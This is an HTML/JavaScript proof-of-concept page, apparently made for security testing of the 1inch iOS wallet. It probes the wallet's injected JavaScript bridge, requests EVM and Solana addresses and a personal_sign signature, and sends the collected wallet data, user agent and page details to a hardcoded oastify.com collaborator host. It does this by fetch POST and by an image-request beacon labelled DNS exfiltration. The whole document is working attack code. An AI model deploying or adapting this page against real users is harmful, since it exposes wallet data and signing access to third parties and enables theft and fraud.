<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>1inch Wallet Bridge Test</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
            background: #f0f0f0;
        }
        .container {
            max-width: 600px;
            margin: 0 auto;
            background: white;
            padding: 20px;
            border-radius: 8px;
        }
        .status {
            padding: 10px;
            margin: 10px 0;
            border-radius: 4px;
        }
        .success { background: #d4edda; border: 1px solid #c3e6cb; }
        .info { background: #d1ecf1; border: 1px solid #bee5eb; }
        .warning { background: #fff3cd; border: 1px solid #ffeaa7; }
        button {
            background: #007bff;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 4px;
            cursor: pointer;
            margin: 5px;
        }
        button:hover { background: #0056b3; }
        .log {
            background: #f8f9fa;
            border: 1px solid #e9ecef;
            padding: 10px;
            margin: 10px 0;
            border-radius: 4px;
            white-space: pre-wrap;
            font-family: monospace;
            max-height: 300px;
            overflow-y: auto;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔓 1inch Wallet Bridge PoC</h1>

        <div id="bridgeStatus" class="status warning">
            Checking wallet bridge availability...
        </div>

        <div id="walletInfo"></div>

        <div>
            <button onclick="getWalletAddress()">Get Wallet Address</button>
            <button onclick="testPersonalSign()">Test Personal Sign</button>
            <button onclick="testSolanaWallet()">Test Solana Wallet</button>
            <button onclick="sendToCollaborator()">Send Data to Collaborator</button>
        </div>

        <div>
            <label>Collaborator URL:</label>
            <input type="text" id="collaboratorUrl" value="https://m7uzv61cl01n9oto5fy8at1zqqwhk98y.oastify.com style="width: 100%; margin: 5px 0;">
        </div>

        <div class="log" id="logOutput"></div>
    </div>

    <script>
        let walletData = {
            evmAddress: null,
            solanaAddress: null,
            bridgeAvailable: false,
            timestamp: new Date().toISOString()
        };

        function log(message) {
            const logOutput = document.getElementById('logOutput');
            const timestamp = new Date().toLocaleTimeString();
            logOutput.textContent += `[${timestamp}] ${message}\n`;
            logOutput.scrollTop = logOutput.scrollHeight;
            console.log(message);
        }

        function updateStatus(message, type = 'info') {
            const status = document.getElementById('bridgeStatus');
            status.textContent = message;
            status.className = `status ${type}`;
        }

        function checkWalletBridge() {
            log('Checking for 1inch wallet bridge...');

            // Check for injected wallet objects
            if (window.OneInchIOSWallet) {
                log('✅ OneInchIOSWallet bridge found!');
                walletData.bridgeAvailable = true;
                updateStatus('1inch Wallet Bridge Available!', 'success');

                // Try to get wallet address automatically
                setTimeout(getWalletAddress, 500);
            } else {
                log('❌ OneInchIOSWallet not found');
                updateStatus('Wallet bridge not detected', 'warning');
            }

            if (window.OneInchSolanaWallet) {
                log('✅ OneInchSolanaWallet bridge found!');
            }

            if (window.jsBridge) {
                log('✅ jsBridge interface found!');
            }

            // Log all available window properties that might be wallet-related
            const walletProps = Object.keys(window).filter(key =>
                key.toLowerCase().includes('wallet') ||
                key.toLowerCase().includes('oneinch') ||
                key.toLowerCase().includes('bridge')
            );
            log(`Available wallet properties: ${walletProps.join(', ')}`);
        }

        function getWalletAddress() {
            log('Attempting to get wallet address...');

            try {
                if (window.OneInchIOSWallet) {
                    // Try to request account info
                    window.OneInchIOSWallet.request({
                        method: 'eth_accounts',
                        params: []
                    }).then(accounts => {
                        if (accounts && accounts.length > 0) {
                            walletData.evmAddress = accounts[0];
                            log(`✅ EVM Address obtained: ${accounts[0]}`);
                            updateWalletInfo();
                        }
                    }).catch(err => {
                        log(`❌ Error getting accounts: ${err.message}`);
                    });

                    // Also try eth_requestAccounts
                    window.OneInchIOSWallet.request({
                        method: 'eth_requestAccounts',
                        params: []
                    }).then(accounts => {
                        if (accounts && accounts.length > 0) {
                            walletData.evmAddress = accounts[0];
                            log(`✅ EVM Address via requestAccounts: ${accounts[0]}`);
                            updateWalletInfo();
                        }
                    }).catch(err => {
                        log(`Request accounts error: ${err.message}`);
                    });
                } else {
                    log('❌ OneInchIOSWallet not available');
                }

                // Try Solana wallet
                if (window.OneInchSolanaWallet) {
                    window.OneInchSolanaWallet.connect().then(account => {
                        if (account && account.publicKey) {
                            walletData.solanaAddress = account.publicKey.toString();
                            log(`✅ Solana Address: ${walletData.solanaAddress}`);
                            updateWalletInfo();
                        }
                    }).catch(err => {
                        log(`Solana connection error: ${err.message}`);
                    });
                }
            } catch (error) {
                log(`❌ Error in getWalletAddress: ${error.message}`);
            }
        }

        function testPersonalSign() {
            log('Testing personal_sign...');

            if (!window.OneInchIOSWallet) {
                log('❌ OneInchIOSWallet not available');
                return;
            }

            if (!walletData.evmAddress) {
                log('⚠️ No EVM address available, getting address first...');
                getWalletAddress();
                setTimeout(testPersonalSign, 2000);
                return;
            }

            const message = "PoC: Testing 1inch wallet bridge access";
            const msgHex = '0x' + Buffer.from(message, 'utf8').toString('hex');

            window.OneInchIOSWallet.request({
                method: 'personal_sign',
                params: [msgHex, walletData.evmAddress]
            }).then(signature => {
                log(`✅ Personal sign successful: ${signature}`);
                walletData.testSignature = signature;
            }).catch(error => {
                log(`❌ Personal sign error: ${error.message}`);
            });
        }

        function testSolanaWallet() {
            log('Testing Solana wallet...');

            if (!window.OneInchSolanaWallet) {
                log('❌ OneInchSolanaWallet not available');
                return;
            }

            window.OneInchSolanaWallet.connect().then(account => {
                log(`✅ Solana wallet connected: ${account.publicKey.toString()}`);
                walletData.solanaAddress = account.publicKey.toString();
                updateWalletInfo();
            }).catch(error => {
                log(`❌ Solana wallet error: ${error.message}`);
            });
        }

        function sendToCollaborator() {
            const collaboratorUrl = document.getElementById('collaboratorUrl').value;

            if (!collaboratorUrl || !collaboratorUrl.startsWith('http')) {
                log('❌ Please enter a valid collaborator URL');
                return;
            }

            log('Sending data to collaborator...');

            const payload = {
                ...walletData,
                userAgent: navigator.userAgent,
                url: window.location.href,
                referrer: document.referrer,
                timestamp: new Date().toISOString(),
                availableObjects: Object.keys(window).filter(key =>
                    key.toLowerCase().includes('wallet') ||
                    key.toLowerCase().includes('oneinch') ||
                    key.toLowerCase().includes('bridge')
                )
            };

            // Send via fetch
            fetch(collaboratorUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload)
            }).then(response => {
                log(`✅ Data sent to collaborator (status: ${response.status})`);
            }).catch(error => {
                log(`❌ Collaborator send error: ${error.message}`);
            });

            // Also try via image request for DNS exfiltration
            const encodedData = btoa(JSON.stringify(payload)).slice(0, 50);
            const img = new Image();
            img.src = `${collaboratorUrl}/${encodedData}.png`;
            img.onload = () => log('✅ Image request sent');
            img.onerror = () => log('❌ Image request failed');
        }

        function updateWalletInfo() {
            const walletInfo = document.getElementById('walletInfo');
            let html = '<div class="status info"><h3>Wallet Information</h3>';

            if (walletData.evmAddress) {
                html += `<p><strong>EVM Address:</strong> ${walletData.evmAddress}</p>`;
            }

            if (walletData.solanaAddress) {
                html += `<p><strong>Solana Address:</strong> ${walletData.solanaAddress}</p>`;
            }

            html += '</div>';
            walletInfo.innerHTML = html;
        }

        // Auto-start when page loads
        window.addEventListener('load', () => {
            log('🚀 1inch Wallet Bridge PoC started');
            log(`User Agent: ${navigator.userAgent}`);
            log(`Page URL: ${window.location.href}`);

            checkWalletBridge();
        });

        // Listen for wallet events
        if (window.OneInchIOSWallet) {
            window.OneInchIOSWallet.on?.('accountsChanged', (accounts) => {
                log(`🔄 Accounts changed: ${accounts.join(', ')}`);
                if (accounts.length > 0) {
                    walletData.evmAddress = accounts[0];
                    updateWalletInfo();
                }
            });

            window.OneInchIOSWallet.on?.('chainChanged', (chainId) => {
                log(`🔄 Chain changed: ${chainId}`);
            });
        }
    </script>
</body>
</html>
